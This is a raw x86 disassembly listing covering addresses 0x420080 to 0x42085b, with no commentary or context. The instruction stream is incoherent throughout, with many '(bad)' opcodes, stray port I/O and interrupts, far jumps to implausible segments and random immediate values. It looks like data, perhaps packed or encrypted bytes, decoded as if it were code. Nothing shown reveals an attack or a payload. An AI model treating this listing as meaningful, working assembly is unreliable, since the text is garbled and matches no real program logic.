  420080:	mov    ebp,0xb327bd17
  420085:	addr16 or eax,0x8d1417ab
  42008b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42008c:	cli    
  42008d:	push   0x7127150c
  420092:	pmulhw mm0,mm5
  420095:	shr    DWORD PTR [esi+0x76],1
  420098:	nop
  420099:	inc    ecx
  42009a:	xchg   edi,eax
  42009b:	cmp    esi,DWORD PTR [eax]
  42009d:	mov    esi,0xe659d37c
  4200a2:	aam    0x12
  4200a4:	mov    ds:0xe0a78ff7,al
  4200a9:	(bad)
  4200ae:	jl     0x42009c
  4200b0:	and    eax,0xe7848abd
  4200b5:	and    esp,0xffffffb3
  4200b8:	mov    cl,0xee
  4200ba:	sbb    ebx,ebp
  4200bc:	dec    esi
  4200bd:	aas    
  4200be:	in     al,0xa9
  4200c0:	xchg   BYTE PTR [eax-0x5e],bl
  4200c3:	not    DWORD PTR [ecx-0x37]
  4200c6:	sub    eax,0x2b218ebd
  4200cb:	push   edx
  4200cc:	push   ss
  4200cd:	jg     0x42006a
  4200cf:	adc    dh,dl
  4200d1:	mov    BYTE PTR [ebp+0x55],bh
  4200d4:	daa    
  4200d5:	(bad)  
  4200d6:	sti    
  4200d7:	repz sbb ebx,DWORD PTR [edx+ebx*2+0x7d90b851]
  4200df:	add    edx,DWORD PTR [edi-0x2efa5546]
  4200e5:	retf   
  4200e6:	daa    
  4200e7:	mov    es,WORD PTR [edi]
  4200e9:	repnz sbb edi,0xc531309b
  4200f0:	and    bl,BYTE PTR [eax+ebx*1+0x73]
  4200f4:	mov    dl,0xe4
  4200f6:	(bad)  
  4200f7:	jle    0x4200cd
  4200f9:	inc    ecx
  4200fa:	push   ebx
  4200fb:	psubq  mm3,QWORD PTR [edi-0x48ebdacb]
  420102:	jp     0x420092
  420104:	jnp    0x4200d5
  420106:	dec    esp
  420107:	sbb    ebp,DWORD PTR [edi]
  420109:	sub    esi,DWORD PTR [edi-0x169cb933]
  42010f:	test   DWORD PTR [esi],eax
  420111:	test   ebp,esp
  420113:	mov    ebp,0xc9934afa
  420118:	push   eax
  420119:	jne    0x420132
  42011b:	arpl   dx,ax
  42011d:	sbb    al,0xf8
  42011f:	repz in eax,dx
  420121:	lods   al,BYTE PTR ds:[esi]
  420122:	sti    
  420123:	dec    esp
  420124:	outs   dx,DWORD PTR ds:[esi]
  420125:	popf   
  420126:	fistp  DWORD PTR [esi]
  420128:	ret    
  420129:	ins    BYTE PTR es:[edi],dx
  42012a:	in     al,0x88
  42012c:	sti    
  42012d:	outs   dx,DWORD PTR ds:[esi]
  42012e:	add    ecx,DWORD PTR [eax+0x2f]
  420131:	push   ss
  420132:	sti    
  420133:	test   al,0x75
  420135:	ss mov eax,0xc4dc9bfc
  42013b:	aad    0xfa
  42013d:	xchg   esi,eax
  42013e:	xchg   edx,eax
  42013f:	je     0x4201b7
  420141:	int    0xb9
  420143:	mov    ch,0xf7
  420145:	cmp    cl,al
  420147:	jb     0x420188
  420149:	out    0xb9,eax
  42014b:	push   ecx
  42014c:	aas    
  42014d:	ret    
  42014e:	shr    ebx,1
  420150:	dec    esi
  420151:	in     eax,0x91
  420153:	ret    
  420154:	pop    eax
  420155:	(bad)  
  420156:	repnz dec ebp
  420158:	jnp    0x42014a
  42015a:	or     ecx,edi
  42015c:	shl    BYTE PTR fs:[eax+0x79],1
  420160:	cmp    edi,DWORD PTR [edx]
  420162:	fldcw  WORD PTR [ebp+0x2b]
  420165:	jl     0x4201a4
  420167:	imul   edx,DWORD PTR ds:0x6b829396,0xffffffdd
  42016e:	lods   eax,DWORD PTR ds:[esi]
  42016f:	scas   eax,DWORD PTR es:[edi]
  420170:	test   dh,bh
  420172:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420173:	loope  0x4201cb
  420175:	xchg   ebx,eax
  420176:	repnz cmp eax,0x27a45bf5
  42017c:	in     al,dx
  42017d:	in     al,0xb4
  42017f:	ret    
  420180:	or     dh,BYTE PTR [edi-0x503f254a]
  420186:	mov    ds:0xf69072e6,eax
  42018b:	or     eax,0x5e29c30c
  420190:	xor    BYTE PTR [ebp+edi*1-0x66],dh
  420194:	pop    es
  420195:	push   ds
  420196:	sbb    dh,al
  420198:	into   
  420199:	cld    
  42019a:	sub    DWORD PTR [edx+ecx*1],ebp
  42019d:	test   BYTE PTR [esp+eax*1+0x4d],bh
  4201a1:	and    cl,BYTE PTR [ebx-0x4f]
  4201a4:	mov    al,0x95
  4201a6:	jp     0x420133
  4201a8:	xchg   edi,eax
  4201a9:	jns    0x4201b0
  4201ab:	(bad)  
  4201ac:	pop    ebp
  4201ad:	shr    DWORD PTR [eax+eiz*1+0x5232a833],0xa6
  4201b5:	adc    al,0xa0
  4201b7:	mov    ebp,0x8a61839c
  4201bc:	mov    ecx,0xb75783a6
  4201c1:	dec    esi
  4201c2:	add    al,0x54
  4201c4:	pushf  
  4201c5:	in     al,dx
  4201c6:	pop    ebp
  4201c7:	test   bh,ch
  4201c9:	pushf  
  4201ca:	mov    bh,0xe6
  4201cc:	gs ret 0xdea6
  4201d0:	ret    
  4201d1:	jge    0x4201e5
  4201d3:	and    eax,0x58e6c2df
  4201d8:	in     al,dx
  4201d9:	xor    bl,BYTE PTR [esi+eiz*2-0x28]
  4201dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201de:	xchg   edi,eax
  4201df:	idiv   DWORD PTR [ebx]
  4201e1:	outs   dx,BYTE PTR ds:[esi]
  4201e2:	test   BYTE PTR [esi-0x44ade79a],ch
  4201e8:	xchg   edx,eax
  4201e9:	imul   ecx,DWORD PTR [edi-0x2e],0xffffffd4
  4201ed:	xor    ah,BYTE PTR [esi-0x499b0f3f]
  4201f3:	mov    al,BYTE PTR [ebx+0x29]
  4201f6:	int    0x4e
  4201f8:	cmp    ah,BYTE PTR [edx-0x60]
  4201fb:	icebp  
  4201fc:	sbb    BYTE PTR [esi+edx*4+0x34d2bc15],ch
  420203:	inc    ecx
  420204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420205:	add    DWORD PTR [edi-0xff28289],edi
  42020b:	lock out dx,eax
  42020d:	popf   
  42020e:	add    dl,ch
  420210:	dec    ecx
  420211:	addr16 test eax,0xdc53af79
  420217:	xchg   DWORD PTR [edi+0x73c54bf0],esp
  42021d:	mov    esp,0x28325c2a
  420222:	pop    ss
  420223:	xchg   ah,cl
  420225:	mov    cl,0x27
  420227:	fsubr  QWORD PTR [ebx+0x26]
  42022a:	adc    BYTE PTR [edi],bh
  42022c:	xchg   esi,eax
  42022d:	xor    esi,DWORD PTR [esi]
  42022f:	xor    eax,0xb025fbdc
  420234:	pop    es
  420235:	int    0x17
  420237:	loopne 0x420217
  420239:	scas   al,BYTE PTR es:[edi]
  42023a:	les    eax,FWORD PTR [eax]
  42023c:	adc    ch,BYTE PTR [edi-0x11]
  42023f:	lock dec edx
  420241:	das    
  420242:	sbb    al,0xc3
  420244:	jp     0x4201e2
  420246:	and    al,0x13
  420248:	popa   
  420249:	mov    al,0x8
  42024b:	je     0x420239
  42024d:	push   ds
  42024e:	pop    edx
  42024f:	mov    esp,0x47421e7d
  420254:	inc    eax
  420255:	dec    esi
  420256:	jmp    0x4202d2
  420258:	into   
  420259:	in     eax,0xcf
  42025b:	fstp   TBYTE PTR [ebx-0x63dfd2a1]
  420261:	adc    DWORD PTR ds:0xa6be73da,ebx
  420267:	add    ch,bh
  420269:	xor    DWORD PTR [ecx],ebx
  42026b:	mov    dl,0xa8
  42026d:	push   ebx
  42026e:	ret    0x2c2c
  420271:	mov    edx,0x3b7d1b9a
  420276:	cmc    
  420277:	mov    eax,edi
  420279:	jmp    0xe5a6:0xbc1d80da
  420280:	lds    esi,FWORD PTR [ecx-0x78]
  420283:	sqrtps xmm7,XMMWORD PTR ds:0x8a53015
  42028a:	cmp    ah,BYTE PTR [ebx-0x4d]
  42028d:	mov    ch,0xa8
  42028f:	out    dx,eax
  420290:	aaa    
  420291:	jbe    0x4202b9
  420293:	inc    eax
  420294:	add    esp,DWORD PTR [esi+0x5818ad43]
  42029a:	jae    0x42022b
  42029c:	mov    eax,ds:0x4f13a2c4
  4202a1:	push   ds
  4202a2:	xlat   BYTE PTR ds:[ebx]
  4202a3:	dec    edi
  4202a4:	inc    eax
  4202a5:	cli    
  4202a6:	dec    eax
  4202a7:	add    DWORD PTR [ecx-0x599d4860],edi
  4202ad:	pop    eax
  4202ae:	pop    esi
  4202af:	test   eax,0x5c8e7400
  4202b4:	ror    eax,0x8
  4202b7:	pushf  
  4202b8:	jae    0x420254
  4202ba:	(bad)  
  4202bb:	adc    al,0xb0
  4202bd:	xor    bl,bh
  4202bf:	pop    ecx
  4202c0:	dec    ebx
  4202c1:	repnz imul BYTE PTR [ecx-0x5b1dd1b6]
  4202c8:	ds push cs
  4202ca:	in     eax,dx
  4202cb:	sbb    eax,0x1fa40eb4
  4202d0:	ror    BYTE PTR [ecx+ebx*2+0x3f],1
  4202d4:	stos   BYTE PTR es:[edi],al
  4202d5:	inc    ebp
  4202d6:	cmp    BYTE PTR [ecx+ebx*1-0x4e2ea057],dh
  4202dd:	data16 icebp 
  4202df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202e0:	and    eax,DWORD PTR [esi*1-0x3085fcf8]
  4202e7:	jno    0x420295
  4202e9:	mov    bl,0xc9
  4202eb:	add    cl,cl
  4202ed:	je     0x4202c5
  4202ef:	(bad)  
  4202f0:	(bad)  
  4202f2:	rol    DWORD PTR [edx-0x20fc3ea0],0xc2
  4202f9:	aas    
  4202fa:	clc    
  4202fb:	in     eax,dx
  4202fc:	dec    ecx
  4202fd:	fnstsw WORD PTR [esi]
  4202ff:	(bad)  
  420300:	shr    BYTE PTR [edx-0x59],cl
  420303:	mov    dl,0x7b
  420305:	stc    
  420306:	add    dl,cl
  420308:	dec    edi
  420309:	hlt    
  42030a:	fild   DWORD PTR [ecx+0x41]
  42030d:	std    
  42030e:	xchg   BYTE PTR [edx+0xb908135],dl
  420314:	sar    BYTE PTR [edx],1
  420316:	into   
  420317:	mov    ebp,DWORD PTR [esi-0x2d]
  42031a:	pop    ss
  42031b:	mov    esi,0x918d036
  420320:	fadd   DWORD PTR [esi]
  420322:	cld    
  420323:	mov    bh,0xea
  420325:	lahf   
  420326:	ror    DWORD PTR [eax-0x3a],1
  420329:	dec    edi
  42032a:	inc    esi
  42032b:	xchg   DWORD PTR [esi],esi
  42032d:	adc    esp,DWORD PTR [eax]
  42032f:	rol    edx,0x58
  420332:	dec    eax
  420333:	ss adc eax,eax
  420336:	aas    
  420337:	ss nop
  420339:	xchg   dl,dl
  42033b:	push   edx
  42033d:	inc    ebp
  42033e:	pop    edx
  42033f:	dec    eax
  420340:	cmp    BYTE PTR [esi-0x5102bce],bh
  420346:	xor    ecx,DWORD PTR [esi+edi*4-0x442f98b8]
  42034d:	test   DWORD PTR [edi],edx
  42034f:	addr16 inc edx
  420351:	mov    eax,0x1d1cf578
  420356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420357:	xchg   BYTE PTR [eax],al
  420359:	mov    ebp,0xf8e016e9
  42035e:	push   ebx
  42035f:	push   edi
  420360:	ds fwait
  420362:	shr    al,cl
  420364:	ret    
  420365:	or     bh,BYTE PTR [ecx+0x4d600d4a]
  42036b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42036c:	add    dh,BYTE PTR [edx+0x58]
  42036f:	dec    esp
  420370:	(bad)  
  420371:	in     al,0x71
  420373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420374:	rcl    DWORD PTR [esi-0x3acd6f85],1
  42037a:	mov    dh,0x23
  42037c:	jne    0x4203f7
  42037e:	inc    ecx
  42037f:	aaa    
  420380:	sbb    DWORD PTR [ebp*2-0x4791248a],eax
  420387:	in     al,dx
  420388:	test   ebx,esi
  42038a:	mov    ds:0x82121376,al
  42038f:	adc    eax,0xe39afbb3
  420394:	in     al,0x68
  420396:	test   eax,0xbf001822
  42039b:	inc    ebp
  42039c:	aas    
  42039d:	(bad)
  4203a2:	pop    ecx
  4203a3:	cli    
  4203a4:	mov    esp,?
  4203a6:	xor    DWORD PTR [edi+eax*8+0x4bd9cb90],0x1a3fc7a5
  4203b1:	out    dx,eax
  4203b2:	mov    ds:0x86e9134e,eax
  4203b7:	jnp    0x42034e
  4203b9:	in     eax,0x87
  4203bb:	hlt    
  4203bc:	push   ebx
  4203bd:	push   esi
  4203be:	and    DWORD PTR [esi+0x2e],ebx
  4203c1:	(bad)  
  4203c2:	rcl    esp,1
  4203c4:	retf   0xaa6b
  4203c7:	xchg   esi,eax
  4203c8:	int3   
  4203c9:	cli    
  4203ca:	gs stos DWORD PTR es:[edi],eax
  4203cc:	adc    eax,0x7be3af0
  4203d1:	outs   dx,DWORD PTR ds:[esi]
  4203d2:	add    eax,0x8dc4690
  4203d7:	popf   
  4203d8:	popf   
  4203d9:	retf   
  4203da:	(bad)  
  4203db:	mov    dh,0x7
  4203dd:	jp     0x4203da
  4203df:	sbb    cl,BYTE PTR [edi-0x17]
  4203e2:	mov    esp,0x9b366211
  4203e7:	retf   
  4203e8:	jge    0x42040e
  4203ea:	mov    ch,0x62
  4203ec:	test   DWORD PTR [edx+0x2cf5444e],edi
  4203f2:	push   ss
  4203f3:	sti    
  4203f4:	pop    es
  4203f5:	xor    al,0x93
  4203f7:	jno    0x420473
  4203f9:	data16 sti 
  4203fb:	pushf  
  4203fc:	adc    ebp,DWORD PTR [edi*8+0x38233f52]
  420403:	je     0x42046b
  420405:	or     al,0x86
  420407:	mov    esi,DWORD PTR [esi+0x72]
  42040a:	pop    ds
  42040b:	das    
  42040c:	sbb    edx,DWORD PTR [eax]
  42040e:	push   ebp
  42040f:	adc    ecx,DWORD PTR [eax-0x6c]
  420412:	add    DWORD PTR [ebx+0x1c426989],ebx
  420418:	add    eax,0xf6c0819b
  42041d:	(bad)  
  42041e:	retf   0x28c
  420421:	mov    ecx,DWORD PTR [edx-0x42c6c22]
  420427:	mov    bl,0xe0
  420429:	or     al,0xe8
  42042b:	(bad)  
  42042c:	push   esp
  42042d:	inc    edx
  42042e:	ins    DWORD PTR es:[edi],dx
  42042f:	push   ecx
  420430:	imul   ebp,DWORD PTR [edx+0x75ea92a3],0x1dd5c032
  42043a:	ror    DWORD PTR [ecx],0xe9
  42043d:	sbb    ax,0xdad9
  420441:	mov    ch,0xd8
  420443:	mov    ecx,0x10a95ff1
  420448:	cmp    BYTE PTR [edi-0x39],al
  42044b:	test   ecx,ebx
  42044d:	pop    esp
  42044e:	aad    0xde
  420450:	mov    bh,0x5e
  420452:	pop    ebp
  420453:	inc    ebp
  420454:	dec    ecx
  420455:	push   0xe68d2a65
  42045a:	outs   dx,BYTE PTR ds:[esi]
  42045b:	adc    al,0x6f
  42045d:	pop    ebx
  42045e:	push   edi
  42045f:	imul   ebp,DWORD PTR [ecx],0xffffffa7
  420462:	sbb    ah,dl
  420464:	mov    eax,0x8e4ca615
  420469:	xlat   BYTE PTR ds:[ebx]
  42046a:	shr    dh,0xeb
  42046d:	xchg   DWORD PTR [ebx],esi
  42046f:	cmp    ch,dh
  420471:	cmp    DWORD PTR [edi],esi
  420473:	push   ds
  420474:	xor    al,0x8e
  420476:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420477:	or     eax,0x935fdd13
  42047c:	mov    bh,BYTE PTR [ebp+0x13818160]
  420482:	jne    0x420503
  420484:	cld    
  420485:	idiv   DWORD PTR ds:0x77731f3a
  42048b:	gs addr16 dec esp
  42048e:	jne    0x420461
  420490:	dec    edi
  420491:	add    al,0x6f
  420493:	mov    bh,0xde
  420495:	rol    al,1
  420497:	cmp    edi,DWORD PTR [edi-0x74]
  42049a:	jnp    0x4204c7
  42049c:	sbb    esi,DWORD PTR [esi+0x79]
  42049f:	jmp    DWORD PTR [ebx]
  4204a1:	cwde   
  4204a2:	dec    ebx
  4204a3:	je     0x420520
  4204a5:	cdq    
  4204a6:	jns    0x420450
  4204a8:	mov    dl,0xa8
  4204aa:	ret    0x3865
  4204ad:	fcom   QWORD PTR [ebp+eax*1+0x20]
  4204b1:	sbb    edx,ebx
  4204b3:	or     eax,0x6922b971
  4204b8:	in     eax,0xe
  4204ba:	(bad)  
  4204bb:	arpl   WORD PTR es:[eax+0x4f08bbd1],bx
  4204c2:	sub    al,0x87
  4204c4:	mov    ah,0x2a
  4204c6:	mov    bh,0x9a
  4204c8:	xchg   ebp,eax
  4204c9:	mov    al,ds:0xb98c2bc
  4204ce:	mov    eax,0xa0d2a72
  4204d3:	sar    BYTE PTR [esi-0xe1a6b3f],0x18
  4204da:	jp     0x42052c
  4204dc:	inc    eax
  4204de:	adc    cl,BYTE PTR ds:0x1a886a71
  4204e4:	adc    BYTE PTR [ecx-0x12],al
  4204e7:	ret    0xa11
  4204ea:	and    BYTE PTR [ecx-0x63751d1c],cl
  4204f0:	mov    esi,gs
  4204f2:	mov    edx,0xcb9f810
  4204f7:	jp     0x42054b
  4204f9:	iret   
  4204fa:	sbb    DWORD PTR [ebx],eax
  4204fc:	push   esp
  4204fd:	retf   
  4204fe:	pop    eax
  4204ff:	add    BYTE PTR [edi+0x2add381],0x70
  420506:	iret   
  420507:	(bad)  
  420508:	repz mov ebp,0x1c5fa726
  42050e:	ins    DWORD PTR es:[edi],dx
  42050f:	enter  0xdb13,0x13
  420513:	test   eax,0x66f99da5
  420518:	xlat   BYTE PTR ds:[ebx]
  420519:	cmp    eax,0xf3b2ba7a
  42051e:	cmp    ah,BYTE PTR ds:0x43241fb2
  420524:	lock in al,0xe0
  420527:	add    eax,0x7d5570b6
  42052c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42052d:	fadd   QWORD PTR [esi+0x58d91e97]
  420533:	dec    edi
  420534:	jg     0x420566
  420536:	push   ds
  420537:	test   BYTE PTR [edi+eiz*8+0x2f69bc8b],cl
  42053e:	mov    ch,0x43
  420540:	mov    ss,esi
  420542:	jo     0x420521
  420544:	test   al,0x77
  420546:	push   edx
  420547:	cmp    eax,0x2bf83a99
  42054c:	popa   
  42054d:	xchg   ebp,eax
  42054e:	lea    edx,[ecx]
  420550:	and    DWORD PTR [edi-0x70],esi
  420553:	dec    esi
  420554:	xchg   ebp,eax
  420555:	mov    bl,0x8a
  420557:	cmp    esi,DWORD PTR [ebp+0x5f59b69d]
  42055d:	xor    DWORD PTR [eax+edx*1-0x42],0xfca0c3a3
  420565:	js     0x420576
  420567:	pop    edi
  420568:	adc    esp,DWORD PTR [ebx+0x52]
  42056b:	repz sub ecx,eax
  42056e:	rol    DWORD PTR [edi],cl
  420570:	mov    edx,0xc5525fed
  420575:	cwde   
  420576:	jae    0x420576
  420578:	pusha  
  420579:	inc    ecx
  42057a:	imul   bh
  42057c:	jmp    0xbac50ada
  420581:	nop
  420582:	std    
  420583:	dec    ebp
  420584:	(bad)  
  420585:	mov    WORD PTR [esi],es
  420587:	cmp    esi,DWORD PTR ds:0x59b05707
  42058d:	iret   
  42058e:	mov    dl,0x43
  420590:	xor    eax,0x247211fc
  420595:	repnz aaa 
  420597:	push   edi
  420598:	mul    eax
  42059a:	mov    DWORD PTR ds:0x7a48547a,esp
  4205a0:	out    dx,eax
  4205a1:	mov    DWORD PTR ds:0x1f24a0e5,ebp
  4205a7:	mov    ds:0x5e2e48fc,al
  4205ac:	mov    ds:0x35736706,al
  4205b1:	push   ss
  4205b2:	jno    0x4205b3
  4205b4:	dec    ebx
  4205b5:	xchg   edx,eax
  4205b6:	daa    
  4205b7:	test   eax,0xfa243d93
  4205bc:	push   0xa529623c
  4205c1:	mov    ch,0x50
  4205c3:	push   es
  4205c4:	imul   esp,DWORD PTR [edi],0xa45b7b5
  4205ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205cb:	pop    ebx
  4205cc:	or     dh,BYTE PTR [esi+0x1]
  4205cf:	fisub  WORD PTR [eax-0x7dbfbd2a]
  4205d5:	or     eax,0x7b4033ae
  4205da:	ins    DWORD PTR es:[edi],dx
  4205db:	jecxz  0x420629
  4205dd:	rcl    ebx,1
  4205df:	pushf  
  4205e0:	int    0xf7
  4205e2:	rcr    DWORD PTR [ecx-0x13aae7a0],0x6b
  4205e9:	pop    es
  4205ea:	es xor al,0x48
  4205ed:	push   esi
  4205ee:	push   ebx
  4205ef:	aad    0x7f
  4205f1:	mov    ah,0x9f
  4205f3:	shl    BYTE PTR [edx],0xf6
  4205f6:	add    edi,DWORD PTR [ebx]
  4205f8:	sbb    bl,BYTE PTR [esi]
  4205fa:	adc    BYTE PTR [edx-0x165caa5a],dh
  420600:	sub    BYTE PTR [ebp+0x53],bl
  420603:	call   DWORD PTR [ebx-0x9]
  420606:	mov    ebx,0x691c4e5c
  42060b:	push   0xffffffb6
  42060d:	adc    al,0xef
  42060f:	clc    
  420610:	div    BYTE PTR [ebx+ebp*4]
  420613:	ja     0x42068c
  420615:	mov    edi,0x333542ff
  42061a:	mov    DWORD PTR [esi-0x7eb60314],edi
  420620:	push   edi
  420621:	pop    ss
  420622:	ror    edi,0x1d
  420625:	and    dl,dl
  420627:	int    0x62
  420629:	xchg   DWORD PTR [ebx+0x1a],edx
  42062c:	ja     0x420670
  42062e:	leave  
  42062f:	(bad)  
  420631:	mov    esp,0x598ab8c
  420636:	ins    DWORD PTR es:[edi],dx
  420637:	pop    edx
  420638:	dec    ecx
  420639:	inc    edi
  42063a:	xor    al,0x20
  42063c:	sbb    eax,0xe33b6534
  420641:	push   edx
  420642:	ror    DWORD PTR [ebx+0x1d034466],1
  420648:	jae    0x4206c3
  42064a:	sti    
  42064b:	leave  
  42064c:	add    edi,DWORD PTR [ecx+0x5dc31068]
  420652:	adc    al,0xec
  420654:	mov    esp,0xad926cb9
  420659:	int3   
  42065a:	xchg   ebx,eax
  42065b:	xor    DWORD PTR [ebx-0x4d50fa30],esi
  420661:	out    dx,eax
  420662:	inc    esp
  420663:	dec    edi
  420664:	xchg   edi,eax
  420665:	push   ss
  420666:	(bad)  
  420667:	mov    BYTE PTR [edx],bl
  420669:	xchg   DWORD PTR [eax+0x64f41941],ebp
  42066f:	jp     0x42061e
  420671:	pop    eax
  420672:	jns    0x4206c6
  420674:	shl    edi,0xf5
  420677:	xchg   DWORD PTR cs:[eax-0x6d],eax
  42067b:	push   edi
  42067c:	adc    ebx,DWORD PTR [ecx+0x17a2aad2]
  420682:	aas    
  420683:	imul   esi,DWORD PTR [ebp+0x36c96939],0x3f983c02
  42068d:	scas   eax,DWORD PTR es:[edi]
  42068e:	call   0x26ec:0x22033386
  420695:	test   eax,0xe14ee6e9
  42069a:	in     eax,0x9
  42069c:	inc    edi
  42069d:	mov    al,ds:0x14594c20
  4206a2:	sti    
  4206a3:	add    al,0xe9
  4206a5:	or     al,0x4a
  4206a7:	fisubr WORD PTR [ebp-0x4d]
  4206aa:	cwde   
  4206ab:	in     al,0xdf
  4206ad:	std    
  4206ae:	or     al,0x8e
  4206b0:	bound  eax,QWORD PTR [ecx+ecx*4-0x2519e558]
  4206b7:	loop   0x420705
  4206b9:	push   ecx
  4206ba:	retf   0x6734
  4206bd:	inc    ebp
  4206be:	js     0x4206e0
  4206c0:	arpl   si,cx
  4206c2:	scas   eax,DWORD PTR es:[edi]
  4206c3:	fwait
  4206c4:	ret    
  4206c5:	lods   eax,DWORD PTR ds:[esi]
  4206c6:	pusha  
  4206c7:	mov    ebx,0x23b86f46
  4206cc:	das    
  4206cd:	aam    0x28
  4206cf:	sti    
  4206d0:	dec    esi
  4206d1:	pop    ds
  4206d2:	and    DWORD PTR [ebx+0x767c6a9f],ebp
  4206d8:	push   ecx
  4206d9:	cld    
  4206da:	mov    fs,esp
  4206dc:	lock ja 0x42072a
  4206df:	jno    0x4206f3
  4206e1:	ins    DWORD PTR es:[edi],dx
  4206e2:	ds dec esi
  4206e4:	(bad)  
  4206e5:	pushf  
  4206e6:	sub    esp,DWORD PTR [edx]
  4206e8:	sahf   
  4206e9:	mov    edx,0x77185fe6
  4206ee:	jl     0x420686
  4206f0:	cli    
  4206f1:	push   ebp
  4206f2:	mov    ebp,0x77aa4d16
  4206f7:	sub    DWORD PTR [esp+ecx*4],edx
  4206fa:	push   esi
  4206fb:	jmp    0x171:0x5f1e097b
  420702:	(bad)  
  420703:	(bad)  
  420704:	test   DWORD PTR [esi],ecx
  420706:	(bad)  
  420707:	adc    edx,edx
  420709:	inc    edi
  42070a:	dec    ebx
  42070b:	mov    ecx,esi
  42070d:	push   0x9cb97dfd
  420712:	cmp    DWORD PTR [ecx],edx
  420714:	mov    ecx,0x8e90bb6d
  420719:	push   esi
  42071a:	mov    ebx,0xf97a0e8a
  42071f:	push   ebx
  420720:	sbb    edi,DWORD PTR [ebx-0x2106d9a1]
  420726:	fcmovnbe st,st(2)
  420728:	sar    esp,1
  42072a:	xor    bh,BYTE PTR [ebp+0x3a9461da]
  420730:	gs pop ebp
  420732:	cmp    eax,0xd117d81e
  420737:	add    edx,ebx
  420739:	pop    ds
  42073a:	push   0x6ffd0f8f
  42073f:	mov    bl,0xb3
  420741:	lods   al,BYTE PTR ds:[esi]
  420742:	mov    ecx,0x56b847c5
  420747:	sub    ah,BYTE PTR [edx-0x2b]
  42074a:	daa    
  42074b:	ins    DWORD PTR es:[edi],dx
  42074c:	jmp    0x1a024739
  420751:	je     0x42075e
  420753:	scas   eax,DWORD PTR es:[edi]
  420754:	int    0x56
  420756:	mov    BYTE PTR [edx],ah
  420758:	pop    eax
  420759:	popf   
  42075a:	jp     0x4207b1
  42075c:	mov    DWORD PTR [ebx-0x51],ebp
  42075f:	inc    ebp
  420760:	pop    ecx
  420761:	jne    0x42072f
  420763:	jbe    0x420797
  420765:	les    ebp,FWORD PTR [ebp+0x12a74fc6]
  42076b:	sub    bh,BYTE PTR [ecx]
  42076d:	sbb    eax,0x7e85744f
  420772:	hlt    
  420773:	loopne 0x420721
  420775:	mov    cs,WORD PTR [edi]
  420777:	cs mov esp,0xdc061f09
  42077d:	inc    edx
  42077e:	sub    bl,BYTE PTR [ecx-0x61]
  420781:	adc    cl,BYTE PTR [edx]
  420783:	push   ds
  420784:	push   ebx
  420785:	sbb    edi,ecx
  420787:	add    BYTE PTR [ebx+0xb],dh
  42078a:	inc    edi
  42078b:	ja     0x42071e
  42078d:	dec    edx
  42078e:	fldenv ds:0x33a8af00
  420794:	xchg   ebx,eax
  420795:	ds pop ds
  420797:	jle    0x420792
  420799:	xchg   esi,eax
  42079a:	mov    WORD PTR [eax],?
  42079c:	mov    eax,ds:0xe2406e22
  4207a1:	fwait
  4207a2:	xchg   edx,eax
  4207a3:	xchg   BYTE PTR [eax+ecx*2-0x5ff1cdea],dl
  4207aa:	push   ss
  4207ab:	push   ebx
  4207ac:	sbb    DWORD PTR [edi],esi
  4207ae:	push   DWORD PTR [ebp+0x61]
  4207b1:	popa   
  4207b2:	add    eax,0xcf6187
  4207b7:	dec    eax
  4207b9:	sub    al,0x82
  4207bb:	sbb    dl,cl
  4207bd:	and    BYTE PTR [eax],0xbe
  4207c0:	dec    edx
  4207c1:	push   ecx
  4207c2:	(bad)  [eax*2-0x63c8aa0e]
  4207c9:	sub    eax,esp
  4207cb:	sub    DWORD PTR [esi],ecx
  4207cd:	loopne 0x4207a1
  4207cf:	lea    esi,[ecx-0x55]
  4207d2:	mov    ch,0x7a
  4207d4:	cli    
  4207d5:	aad    0x28
  4207d7:	mov    dl,0x5b
  4207d9:	cmp    al,BYTE PTR [ecx+ebp*8]
  4207dc:	inc    ebp
  4207dd:	xchg   DWORD PTR [ebp+0x16],ebp
  4207e0:	stos   DWORD PTR es:[edi],eax
  4207e1:	addr16 lock pusha 
  4207e4:	inc    ecx
  4207e5:	push   ebp
  4207e6:	das    
  4207e7:	dec    eax
  4207e8:	sub    BYTE PTR [eax+0x1e],bl
  4207eb:	sbb    DWORD PTR [ecx],0xe
  4207ee:	cmp    DWORD PTR [ecx+0x32],esi
  4207f1:	and    DWORD PTR [edx],esi
  4207f3:	dec    esp
  4207f4:	mov    ds:0x734dfdb4,al
  4207f9:	lahf   
  4207fa:	adc    BYTE PTR [esi+0x64],ch
  4207fd:	mov    edx,0x91bf509a
  420802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420803:	in     eax,0x2b
  420805:	adc    bh,bh
  420807:	fidiv  WORD PTR [ecx-0x5958180d]
  42080d:	push   eax
  42080e:	(bad)  [ecx-0x3d]
  420811:	jecxz  0x4207db
  420813:	inc    edi
  420814:	outs   dx,DWORD PTR ds:[esi]
  420815:	and    BYTE PTR [eax+0x3a],ah
  420818:	mov    eax,ds:0x51466175
  42081d:	add    al,ch
  42081f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420820:	(bad)  
  420821:	mov    al,0xf5
  420823:	add    al,BYTE PTR [ebp-0x313476ca]
  420829:	rol    BYTE PTR [edi-0x555299cc],0x60
  420830:	xor    al,0x60
  420832:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420833:	test   eax,0x8298afae
  420838:	mov    al,ds:0x4c3f47f
  42083d:	xlat   BYTE PTR ds:[ebx]
  42083e:	sbb    BYTE PTR [edx],al
  420840:	sbb    bl,BYTE PTR [eax-0x51c05146]
  420846:	(bad)  
  420847:	or     DWORD PTR [ecx],edi
  420849:	std    
  42084a:	dec    edi
  42084b:	or     al,0xa1
  42084d:	jno    0x4208af
  42084f:	add    eax,0x7cbb307d
  420854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420855:	mov    DWORD PTR [eax],eax
  420857:	pop    DWORD PTR [eax]
  420859:	jae    0x42087f
  42085b:	sbb    al,0x4
